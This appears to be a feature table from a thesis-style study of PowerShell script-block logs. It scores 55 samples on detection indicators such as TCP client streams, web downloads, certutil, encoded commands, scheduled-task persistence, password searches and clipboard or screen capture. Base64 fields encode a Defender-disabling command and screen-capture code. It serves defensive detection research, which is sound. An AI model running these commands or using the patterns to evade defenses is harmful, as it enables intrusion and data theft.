id,lexical_input_source,analysis_length,line_count,token_count,special_char_count,special_char_ratio,digit_ratio,whitespace_ratio,entropy,quoted_literal_count,short_literal_count,joined_literal_length,base64_candidate_count,longest_base64_candidate,decoded_view_count,backtick_count,concat_operator_count,join_operator_count,format_operator_count,char_cast_count,suspicious_mixed_case_count,suspicious_mixed_case_tokens,execution_hit_count,execution_hits,raw_execution_hit_count,recovered_execution_hit_count,decoded_execution_hit_count,download_hit_count,download_hits,raw_download_hit_count,recovered_download_hit_count,decoded_download_hit_count,network_c2_hit_count,network_c2_hits,raw_network_c2_hit_count,recovered_network_c2_hit_count,decoded_network_c2_hit_count,defense_evasion_hit_count,defense_evasion_hits,raw_defense_evasion_hit_count,recovered_defense_evasion_hit_count,decoded_defense_evasion_hit_count,persistence_hit_count,persistence_hits,raw_persistence_hit_count,recovered_persistence_hit_count,decoded_persistence_hit_count,credential_access_hit_count,credential_access_hits,raw_credential_access_hit_count,recovered_credential_access_hit_count,decoded_credential_access_hit_count,lolbin_hit_count,lolbin_hits,raw_lolbin_hit_count,recovered_lolbin_hit_count,decoded_lolbin_hit_count,collection_hit_count,collection_hits,raw_collection_hit_count,recovered_collection_hit_count,decoded_collection_hit_count,remote_execution_hit_count,remote_execution_hits,raw_remote_execution_hit_count,recovered_remote_execution_hit_count,decoded_remote_execution_hit_count,discovery_hit_count,discovery_hits,raw_discovery_hit_count,recovered_discovery_hit_count,decoded_discovery_hit_count,indicator_category_count,high_risk_category_count,raw_indicator_hit_count,indicator_hit_count,recovered_indicator_hit_count,decoded_indicator_hit_count
PST-001,windows_event_4104_scriptblocktext,284,1,31,94,0.330986,0.06338,0.03169,5.112692,12,8,175,0,0,0,0,0,1,0,0,1,Sockets.TcpC,0,,0,0,0,0,,0,0,0,2,getstream;tcpclient,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,2,2,0
PST-002,windows_event_4104_scriptblocktext,125,1,9,20,0.16,0.0,0.032,4.934428,1,0,57,1,26,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-003,windows_event_4104_scriptblocktext,260,1,34,94,0.361538,0.05,0.023077,5.01455,12,12,147,0,0,0,0,0,1,0,0,1,Invoke-WebR,0,,0,0,0,1,invoke-webrequest,0,1,0,1,jitter,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,0,2,2,0
PST-004,windows_event_4104_scriptblocktext,225,1,25,76,0.337778,0.0,0.04,4.93609,13,13,111,0,0,0,0,0,1,0,0,1,Get-ChildIte,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,collect.zip;compress-archive,0,2,0,0,,0,0,0,1,get-childitem,0,1,0,2,0,0,3,3,0
PST-005,windows_event_4104_scriptblocktext,131,1,19,48,0.366412,0.0,0.061069,4.847498,9,8,43,0,0,0,3,0,1,0,0,1,gEt-PrOc,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,0,1,0,1,0,0,1,1,0
PST-006,windows_event_4104_scriptblocktext,49,1,6,5,0.102041,0.020408,0.122449,4.126226,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-007,windows_event_4104_scriptblocktext,97,1,11,10,0.103093,0.020619,0.113402,4.631482,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-008,windows_event_4104_scriptblocktext,157,1,14,28,0.178344,0.012739,0.063694,5.132935,2,2,22,0,0,0,0,0,0,0,0,1,Get-FileHash,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-009,windows_event_4104_scriptblocktext,109,1,14,23,0.211009,0.018349,0.06422,4.734244,1,0,71,0,0,0,2,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,regsvr32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-010,windows_event_4104_scriptblocktext,198,1,20,54,0.272727,0.0,0.131313,4.715514,10,10,111,0,0,0,0,9,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,collect.zip;compress-archive,1,1,0,0,,0,0,0,1,get-childitem,0,1,0,2,0,1,3,2,0
PST-011,windows_event_4104_scriptblocktext,162,1,16,39,0.240741,0.0,0.067901,4.752823,1,0,116,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,password;select-string,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,2,1,3,3,0,0
PST-012,windows_event_4104_scriptblocktext,74,1,7,5,0.067568,0.013514,0.094595,4.450349,0,0,0,0,0,0,0,0,0,0,0,1,Get-LocalGroup,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-013,windows_event_4104_scriptblocktext,58,1,8,8,0.137931,0.017241,0.103448,4.38512,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-014,windows_event_4104_scriptblocktext,326,1,10,26,0.079755,0.03681,0.009202,5.087623,1,0,204,1,204,1,0,0,0,0,0,2,FromBase64String;WwBTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBHAHIAYQBwAGgAaQBjAHMAXQA6ADoARgByAG8AbQBJAG0AYQBnAGUAKAAkAGIAbQBwACkALgBDAG8AcAB5AEYAcgBvAG0AUwBjAHIAZQBlAG4AKAAwACwAMAAsADAALAAwACwAJABiAG0AcAAuAFMAaQB6AGUAKQA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,copyfromscreen,0,1,1,0,,0,0,0,0,,0,0,0,2,1,1,2,1,1
PST-015,windows_event_4104_scriptblocktext,280,1,32,48,0.171429,0.014286,0.042857,5.129698,1,0,236,0,0,1,18,0,0,0,0,1,AdABlAC0ATwB1AH,1,encodedcommand,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,new-scheduledtaskaction;register-scheduledtask,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-016,windows_event_4104_scriptblocktext,85,1,10,10,0.117647,0.011765,0.129412,4.400264,1,1,7,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-017,windows_event_4104_scriptblocktext,90,1,9,11,0.122222,0.0,0.077778,4.753857,0,0,0,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-018,windows_event_4104_scriptblocktext,354,1,10,27,0.076271,0.033898,0.008475,5.045999,1,0,232,1,232,1,0,0,0,0,0,2,FromBase64String;UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACcAQwA6AFwAXwBfAFQASABFAFMASQBTAF8ASQBOAEUAUgBUAF8AXwAnACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlAA,0,,0,0,0,0,,0,0,0,0,,0,0,0,4,disableRealtimeMonitoring;exclusionpath;frombase64string;set-mppreference,1,3,3,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,4,3,3
PST-019,windows_event_4104_scriptblocktext,140,1,7,20,0.142857,0.05,0.021429,5.121303,1,0,64,1,64,1,0,0,0,0,0,2,FromBase64String;VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAZQBzAHQAIABvAG4AbAB5ACcA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-020,windows_event_4104_scriptblocktext,191,1,25,84,0.439791,0.0,0.052356,4.831684,13,12,85,0,0,0,4,0,1,0,0,0,,1,get-command,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0
PST-021,windows_event_4104_scriptblocktext,78,1,7,23,0.294872,0.0,0.128205,4.591644,4,4,37,0,0,0,0,3,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-022,windows_event_4104_scriptblocktext,85,1,9,14,0.164706,0.0,0.070588,4.639256,1,0,47,0,0,0,2,0,0,0,0,1,ConvertTo-Json,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-clipboard,1,0,0,0,,0,0,0,0,,0,0,0,1,0,1,1,0,0
PST-023,windows_event_4104_scriptblocktext,215,1,19,48,0.223256,0.083721,0.037209,5.14773,1,0,175,0,0,0,0,0,0,0,0,1,System.Net.Sockets.TcpClient,0,,0,0,0,0,,0,0,0,2,getstream;tcpclient,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0
PST-024,windows_event_4104_scriptblocktext,223,1,11,21,0.09417,0.017937,0.049327,5.165345,1,0,183,1,72,1,0,0,0,0,0,0,,2,encodedcommand;scriptblock,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,computername;invoke-command,2,0,0,0,,0,0,0,2,2,4,4,0,0
PST-025,windows_event_4104_scriptblocktext,215,1,29,81,0.376744,0.0,0.04186,5.023609,14,13,108,0,0,0,4,0,1,0,0,2,ESTInAtIOn;eXaMpLe.,0,,0,0,0,1,start-bitstransfer,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0
PST-026,windows_event_4104_scriptblocktext,145,1,17,35,0.241379,0.0,0.041379,4.898866,1,0,103,0,0,0,6,0,0,0,0,0,,0,,0,0,0,1,invoke-webrequest,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-027,windows_event_4104_scriptblocktext,177,1,16,42,0.237288,0.00565,0.045198,5.150515,1,0,135,0,0,0,0,0,0,0,0,1,MsXml2.ServerXmlHttp,1,iex,1,0,0,2,responseText;serverxmlhttp,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-028,windows_event_4104_scriptblocktext,287,1,32,94,0.327526,0.0,0.041812,5.106061,12,7,180,0,0,0,0,0,1,1,0,0,,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0
PST-029,windows_event_4104_scriptblocktext,140,1,14,13,0.092857,0.014286,0.092857,4.717295,1,1,16,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-030,windows_event_4104_scriptblocktext,87,1,10,19,0.218391,0.022989,0.045977,4.840378,1,0,53,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-031,windows_event_4104_scriptblocktext,94,1,11,11,0.117021,0.010638,0.106383,4.715151,1,1,16,0,0,0,0,0,0,0,0,1,AccessToString,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-032,windows_event_4104_scriptblocktext,223,1,22,28,0.125561,0.008969,0.080717,5.232695,1,0,183,0,0,0,0,0,0,0,0,5,MEMBeRDeFInitiOn;PRoCEssiD;ThESis.inErT;naTivEMeTHoDs;openPRoCEsS,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,add-type,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-033,windows_event_4104_scriptblocktext,47,2,6,6,0.12766,0.021277,0.148936,4.378329,0,0,0,0,0,0,1,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-034,windows_event_4104_scriptblocktext,482,1,10,27,0.056017,0.024896,0.006224,4.797927,1,0,360,1,360,1,0,0,0,0,0,1,FromBase64String,2,encodedcommand;windowstyle hidden,0,2,2,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,3,2,2
PST-035,windows_event_4104_scriptblocktext,114,1,12,25,0.219298,0.035088,0.017544,5.30821,1,0,76,0,0,0,0,0,0,0,0,2,cOPyfrOMSCreEN;sYStem.DRaWinG.GRAphics,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,copyfromscreen,1,0,0,0,,0,0,0,0,,0,0,0,1,0,1,1,0,0
PST-036,windows_event_4104_scriptblocktext,114,1,13,21,0.184211,0.008772,0.070175,4.831164,2,1,51,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-037,windows_event_4104_scriptblocktext,36,1,4,10,0.277778,0.0,0.055556,4.00675,3,3,14,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-038,windows_event_4104_scriptblocktext,190,1,21,67,0.352632,0.021053,0.015789,5.12716,11,11,84,0,0,1,0,0,1,0,0,1,VEhFU0lTL,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,assembly]::load;frombase64string;reflection.assembly,0,3,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,3,3,0
PST-039,windows_event_4104_scriptblocktext,292,1,26,67,0.229452,0.013699,0.041096,5.247575,12,8,183,0,0,1,0,0,1,0,0,2,ABlAC0ATwB1AH;VwByAGkAd,2,encodedcommand;scriptblock,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,computername;invoke-command,2,0,0,0,,0,0,0,2,2,2,4,2,0
PST-040,windows_event_4104_scriptblocktext,78,1,8,12,0.153846,0.0,0.064103,4.628038,1,0,40,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-041,windows_event_4104_scriptblocktext,110,1,8,15,0.136364,0.0,0.045455,4.750958,1,0,72,0,0,0,0,0,0,0,0,2,Get-PSReadLineOption;HistorySavePath,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-042,windows_event_4104_scriptblocktext,21,1,2,2,0.095238,0.0,0.047619,3.975418,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-043,windows_event_4104_scriptblocktext,292,1,35,74,0.253425,0.006849,0.065068,4.897296,12,9,183,0,0,0,0,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,add-type,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-044,windows_event_4104_scriptblocktext,124,1,10,24,0.193548,0.008065,0.048387,5.126387,1,1,6,0,0,0,0,0,0,0,0,1,Get-FileHash,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-045,windows_event_4104_scriptblocktext,331,1,28,76,0.229607,0.012085,0.039275,5.167015,12,2,218,0,0,1,0,0,1,0,0,4,AEUAUgBUACcA;AdABlAC0ATwB1AHQAcA;New-ScheduledTaskAc;VwByAGk,1,encodedcommand,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,new-scheduledtaskaction;register-scheduledtask,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,0,3,3,0
PST-046,windows_event_4104_scriptblocktext,242,1,10,25,0.103306,0.028926,0.012397,5.158981,1,0,120,1,120,1,0,0,0,0,0,2,FromBase64String;RwBlAHQALQBDAGwAaQBwAGIAbwBhAHIAZAAgAC0AUgBhAHcAIAB8ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBKAHMAbwBuACAALQBDAG8AbQBwAHIAZQBzAHMA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-clipboard,0,1,1,0,,0,0,0,0,,0,0,0,2,1,1,2,1,1
PST-047,windows_event_4104_scriptblocktext,124,1,7,21,0.169355,0.0,0.032258,4.802535,1,0,84,0,0,0,0,0,0,0,0,1,Get-ItemProperty,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,1,0,0,1,0,1,1,0,0
PST-048,windows_event_4104_scriptblocktext,160,1,17,45,0.28125,0.0,0.15625,4.464693,11,11,72,0,0,0,0,10,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-049,windows_event_4104_scriptblocktext,168,1,17,42,0.25,0.011905,0.047619,5.254407,1,0,122,0,0,0,0,0,0,0,0,2,aPI.eXAmplE.INvaLID;inVokE-ReSTMetHod,0,,0,0,0,1,invoke-restmethod,1,0,0,1,checkin,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0
PST-050,windows_event_4104_scriptblocktext,62,1,7,12,0.193548,0.0,0.048387,4.776462,0,0,0,0,0,0,0,0,0,0,0,1,ConvertTo-Json,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0
PST-051,windows_event_4104_scriptblocktext,114,1,12,19,0.166667,0.0,0.04386,4.803555,1,0,76,0,0,0,4,0,0,0,0,1,Get-PSReadLineOption,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-052,windows_event_4104_scriptblocktext,191,1,26,71,0.371728,0.0,0.036649,5.093887,12,11,92,0,0,0,8,0,1,0,0,1,ENtvERsI,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,0,1,0,1,0,0,1,1,0
PST-053,windows_event_4104_scriptblocktext,170,1,24,60,0.352941,0.0,0.058824,4.876493,11,10,74,0,0,0,4,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,0,1,0,1,0,0,1,1,0
PST-054,windows_event_4104_scriptblocktext,123,1,13,15,0.121951,0.00813,0.089431,4.820234,1,1,16,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-055,windows_event_4104_scriptblocktext,124,1,8,24,0.193548,0.032258,0.016129,5.378597,1,0,84,1,24,0,0,0,0,0,0,3,ReFLection.asSemBLy;fRombaSE64STRiNG;vehfu0LtLUlOrVJUluRVtU1z,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,assembly]::load;frombase64string;reflection.assembly,3,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,3,3,0,0
